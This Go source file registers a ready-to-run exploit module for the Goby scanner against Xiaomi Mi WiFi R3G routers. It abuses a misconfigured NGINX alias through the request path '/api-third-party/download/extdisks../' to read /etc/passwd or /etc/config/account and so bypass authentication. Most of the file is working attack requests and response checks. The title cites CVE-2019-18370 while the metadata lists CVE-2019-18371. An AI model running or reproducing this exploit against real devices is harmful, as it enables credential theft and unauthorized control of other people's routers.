package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "xiaomi Mi wiFi From File Read To Login (CVE-2019-18370)",
  "Description": "An issue was discovered on Xiaomi Mi WiFi R3G devices before 2.28.23-stable. There is a directory traversal vulnerability to read arbitrary files via a misconfigured NGINX alias, as demonstrated by api-third-party/download/extdisks../etc/config/account. With this vulnerability, the attacker can bypass authentication.",
  "Product": "Mi Router",
  "Homepage": "http://miwifi.com/",
  "DisclosureDate": "2021-07-04",
  "Author": "luckying1314@gmail.com",
  "GobyQuery": "title=\"小米路由器\"",
  "Level": "2",
  "Impact": "<p><span style=\"font-size: 14px;\">Arbitrary file download or read vulnerability is mainly because when the application system provides the function of file download or read, the application system directly specifies the file path in the file path parameter and does not verify the legitimacy of the file path, resulting in the attacker can jump through the directory (..</span><span style=\"font-size: 14px;\">\\ or..</span><span style=\"font-size: 14px;\">/) way to download or read a file outside the original specified path.</span><span style=\"font-size: 14px;\">The attacker can finally download or read any file on the system through the vulnerability, such as database files, application system source code, password configuration information and other important sensitive information, resulting in the sensitive information leakage of the system.</span><br></p>",
  "Recommandation": "<p><span style=\"font-size: 14px;\">Limit..</span><span style=\"font-size: 14px;\">/ symbol, file download to determine the input path, the best way is that the file should be in the database for one-to-one correspondence, avoid by entering the absolute path to get files.</span><br></p>",
  "References": [
    "https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "path",
      "type": "createSelect",
      "value": "../etc/passwd,../etc/config/account",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/api-third-party/download/extdisks../etc/passwd",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/api-third-party/download/extdisks{{{path}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "fileread"
  ],
  "CVEIDs": [
    "CVE-2019-18371"
  ],
  "CVSSScore": "3.1",
  "AttackSurfaces": {
    "Application": [
      "Mi Router"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}